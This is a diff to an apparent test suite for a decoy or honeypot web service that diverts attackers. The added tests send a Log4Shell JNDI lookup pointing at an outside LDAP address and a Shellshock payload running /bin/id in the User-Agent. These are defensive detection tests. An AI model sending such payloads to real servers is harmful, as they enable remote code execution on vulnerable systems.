@@ -168,7 +168,7 @@ async def test_a_bait_path_keeps_its_decoy_page_and_diverts_what_follows(site):
     async with _client(base_url) as client:
         env = await client.get("/.env")
         after = await client.get("/")
-    assert "DB_PASS=" in env.text
+    assert "DB_PASSWORD=" in env.text
     assert after.json()["app"] == "decoy"
     payload = await asyncio.wait_for(ingested.get(), timeout=10)
     assert _diversions(payload)[0]["reason"] == "requested bait path /.env"
@@ -346,3 +346,37 @@ async def test_zero_idle_delivers_one_session_per_connection(site, monkeypatch):
     for payload in (first, second):
         requests = [t for t in payload["transcript"] if t["command"].startswith("GET ")]
         assert len(requests) == 1
+
+
+async def test_an_attack_in_a_header_diverts(site):
+    """A JNDI lookup in a made-up header, with nothing in the URL or body."""
+    base_url, ingested = site
+    async with _client(base_url) as client:
+        before = await client.get("/api/products")
+        attack = await client.get("/api/products", headers={"x-api-version": "${jndi:ldap://203.0.113.9/a}"})
+        after = await client.get("/api/account")
+    assert [a.json()["app"] for a in (before, attack, after)] == ["live", "decoy", "decoy"]
+    payload = await asyncio.wait_for(ingested.get(), timeout=10)
+    assert _diversions(payload)[0]["reason"] == "log4shell_attempt in the x-api-version header"
+
+
+async def test_a_shell_function_in_the_user_agent_diverts(site):
+    base_url, _ = site
+    async with _client(base_url, "() { :;}; /bin/id") as client:
+        answer = await client.get("/")
+    assert answer.json()["app"] == "decoy"
+
+
+async def test_ordinary_browser_headers_are_not_an_attack(site):
+    base_url, _ = site
+    headers = {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8",
+        "accept-language": "en-GB,en;q=0.9",
+        "referer": "https://www.example.org/search?q=cordless+drill&page=2",
+        "cookie": "theme=dark; consent=eyJhIjoxLCJiIjoiMT0xIn0=; visitor=GA1.2.1234.5678",
+        "sec-ch-ua": '"Chromium";v="140", "Not?A_Brand";v="24"',
+        "if-none-match": 'W/"2a-abc"',
+    }
+    async with _client(base_url) as client:
+        answers = [await client.get("/", headers=headers) for _ in range(2)]
+    assert [a.json()["app"] for a in answers] == ["live", "live"]
